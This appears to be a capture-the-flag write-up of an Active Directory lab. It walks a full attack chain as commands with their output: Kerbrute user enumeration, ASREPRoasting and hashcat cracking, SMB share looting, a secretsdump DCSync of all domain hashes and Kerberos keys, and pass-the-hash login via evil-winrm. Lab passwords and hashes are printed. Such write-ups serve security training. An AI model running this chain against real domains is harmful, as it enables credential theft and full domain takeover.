
## Enumeration

Basic enumeration starts out with an nmap scan. Nmap is a relatively complex utility that has been refined over the years to detect what ports are open on a device, what services are running, and even detect what operating system is running. It's important to note that not all services may be deteted correctly and not enumerated to it's fullest potential. Despite nmap being an overly complex utility, it cannot enumerate everything. Therefore after an initial nmap scan we'll be using other utilities to help us enumerate the services running on the device.

```
ORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-15 17:35:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-05-15T17:36:14+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-05-15T17:36:05+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2023-05-14T17:07:10
|_Not valid after:  2023-11-13T17:07:10
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/15%OT=53%CT=1%CU=44723%PV=Y%DS=2%DC=T%G=Y%TM=64626D9
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS=
OS:U)OPS(O1=M508NW8NNS%O2=M508NW8NNS%O3=M508NW8%O4=M508NW8NNS%O5=M508NW8NNS
OS:%O6=M508NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%
OS:DF=Y%T=80%W=FFFF%O=M508NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S
OS:=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=
OS:Z)

Network Distance: 2 hops
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-05-15T17:36:06
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   71.47 ms 10.8.0.1
2   71.57 ms 10.10.219.70
```

Also did a scan with [enum4linux](https://www.kali.org/tools/enum4linux/).

#### Enumerating Users via Kerberos 

A whole host of other services are running, including Kerberos. Kerberos is a key authentication service within Active Directory. With this port open, we can use a tool called [Kerbrute](https://github.com/ropnop/kerbrute) (by Ronnie Flathers @ropnop) to brute force discovery of users, passwords and even password spray!

I downloaded the package for github, added executable rights with `chmod +x [file name]`
and run it.
The `userenum` command looks promising.
To discover the users I run :
`./kerbrute_linux_amd64 userenum --dc [ip] -d spookysec.local [list with users]` and I got:

```
2023/05/15 19:20:47 >  [+] VALID USERNAME:	 james@spookysec.local
2023/05/15 19:20:47 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
2023/05/15 19:20:47 >  [+] VALID USERNAME:	 James@spookysec.local
2023/05/15 19:20:47 >  [+] VALID USERNAME:	 robin@spookysec.local
2023/05/15 19:20:47 >  [+] VALID USERNAME:	 darkstar@spookysec.local
2023/05/15 19:20:47 >  [+] VALID USERNAME:	 administrator@spookysec.local
2023/05/15 19:20:47 >  [+] VALID USERNAME:	 backup@spookysec.local
2023/05/15 19:20:48 >  [+] VALID USERNAME:	 paradox@spookysec.local
2023/05/15 19:20:48 >  [+] VALID USERNAME:	 JAMES@spookysec.local
2023/05/15 19:20:49 >  [+] VALID USERNAME:	 Robin@spookysec.local
2023/05/15 19:20:50 >  [+] VALID USERNAME:	 Administrator@spookysec.local
2023/05/15 19:20:53 >  [+] VALID USERNAME:	 Darkstar@spookysec.local
2023/05/15 19:20:54 >  [+] VALID USERNAME:	 Paradox@spookysec.local
2023/05/15 19:20:57 >  [+] VALID USERNAME:	 DARKSTAR@spookysec.local
2023/05/15 19:20:57 >  [+] VALID USERNAME:	 ori@spookysec.local
2023/05/15 19:20:59 >  [+] VALID USERNAME:	 ROBIN@spookysec.local

```

So svc-admin and backup looks juicy!

## Explotation

After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called **ASREPRoasting.** ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account **does not** need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

 Impacket may also need you to use a python version >=3.7. In the AttackBox you can do this by running your command with `python3.9 /opt/impacket/examples/GetNPUsers.py -no-pass -usersfile ./myusers.txt -dc-ip 10.10.219.70 spookysec.local/` 
 
-  myusers.txt has the two usernames stated above

 And I got 
 
 ```
 $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:673e94a3b1b5d5f8d933f4bd195c5b6a$d0e401e6dfe20a1e1ae75ad61c766ca8326d7ee8924bdf0b09108e18a15baa34f61756914c85610283df33fd352f7b023814a764673711ded6a3c47d7e2abf34ee74e88e54e0fd88be33e1bc6c60e2193d52b26f6630a2dca9a3c568db149300140440d525314f7671f25203994507d8c959cba77117649c0f8cf5748a6bcf072c043ed24df5b61b5debd9a139b28e9b300fc90cac962d7bb151d8e2ad4d7b77254829dcd11143cd9012e4343f85565115e9b7cf99230568108e01700e378f290dd5ed6ea590504e251ec24100deb547903408c55c4dc1518fcb4761612b63d52ec384ec09a47289df142b1d4cecd942ca2e

```

for user svc-admin I get the above.
I save it in a file called target_hashes.txt

We are going to use Hashcat with ` hashcat -m 18200 target_hashes.txt [list of passwords]

-   **-m 18200** designates the type of hash we are cracking kerberos
-   **target_hashes.txt** is our input file of hashes
-   pass.txt is the absolute path to the wordlist file for this dictionary

and then `hashcat -m 18200 target_hashes.txt --show`
and get 
```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:673e94a3b1b5d5f8d933f4bd195c5b6a$d0e401e6dfe20a1e1ae75ad61c766ca8326d7ee8924bdf0b09108e18a15baa34f61756914c85610283df33fd352f7b023814a764673711ded6a3c47d7e2abf34ee74e88e54e0fd88be33e1bc6c60e2193d52b26f6630a2dca9a3c568db149300140440d525314f7671f25203994507d8c959cba77117649c0f8cf5748a6bcf072c043ed24df5b61b5debd9a139b28e9b300fc90cac962d7bb151d8e2ad4d7b77254829dcd11143cd9012e4343f85565115e9b7cf99230568108e01700e378f290dd5ed6ea590504e251ec24100deb547903408c55c4dc1518fcb4761612b63d52ec384ec09a47289df142b1d4cecd942ca2e:management2005
```

with the password at the end!
Password : management2005

## Enumeration 

With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.

I will use smbclient with -L to list the shares.
To find all the shares I type : `smbclient -L [ip] -U svc-admin` and using the password from before (management2005).

```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 

```

I have acces to the `backup` share , so to login in I type : `smbclient  //10.10.219.70/backup -U svc-admin` followed by the password.
I find a file and download it with `get [file name]`
I open it locally and get : `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`
I decode it with `base64 -d [file]` and get:
`backup@spookysec.local:backup2517860`
and get the password for backup : backup2517860

## Domain Privilege Escalation 

Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account "backup" gets us thinking. What is this the backup account to?

Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes

Knowing this, we can use another tool within Impacket called [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py). This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.

I use `secretsdump.py -just-dc backup@[ip]` with the password backup2517860 from last topic and get:
```
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:6287354778e244331fcba5469a505e73:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:9af84910c90f842fd785b78a9646656e730dc7f5c4681b9aa853ae4449faefeb
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:aca824f440b3ec7670ca799cdbecb21a
ATTACKTIVEDIREC$:des-cbc-md5:088c85ecdc9bf7f4
[*] Cleaning up... 
```
the Administrators NTLM hash is `0e0363213e37b94221497260b0bcb4fc`


## Flag Submission 

To enter the system I use ` evil-winrm -i [ip] -u Administrator -H 0e0363213e37b94221497260b0bcb4fc`

I am in.
I find the first flag in \\Users\\svc-admin\\Desktop
The second in \\Users\\backup\\Desktop
And the third in \\Users\\Administrator\\Desktop
